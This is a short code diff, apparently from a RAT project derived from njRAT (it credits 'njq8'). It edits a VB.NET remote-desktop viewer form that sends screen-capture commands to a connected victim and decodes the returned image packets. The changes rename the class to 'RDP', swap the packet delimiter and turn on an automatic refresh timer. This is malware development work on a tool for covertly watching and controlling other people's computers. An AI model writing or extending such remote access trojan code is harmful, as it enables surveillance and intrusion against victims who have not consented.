@@ -1,4 +1,4 @@
-﻿Public Class Cap
+﻿Public Class RDP
     'credit njq8
     Public F As Form1
     Public u As USER
@@ -11,10 +11,10 @@
         Next
 
         P1.Image = New Bitmap(Sz.Width, Sz.Height)
-        C1.SelectedIndex = 1
+        C1.SelectedIndex = 2
         C.Value = 55
         Timer1.Interval = 1000
-        ' Timer1.Start()
+        Timer1.Start()
     End Sub
 
     Public Sub PktToImage(ByVal BY As Byte())
@@ -22,7 +22,7 @@
             If Button1.Text = "Stop" Then
                 F.S.Send(u, "@" & F.SPL & C1.SelectedIndex & F.SPL & C2 & F.SPL & C.Value)
             End If
-            Dim B As Array = fx(BY, "njq8")
+            Dim B As Array = fx(BY, "|'IMG'|")
             Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
             Dim L As Bitmap = Image.FromStream(Q)
             Dim QQ As String() = Split(BS(B(0)), ",")
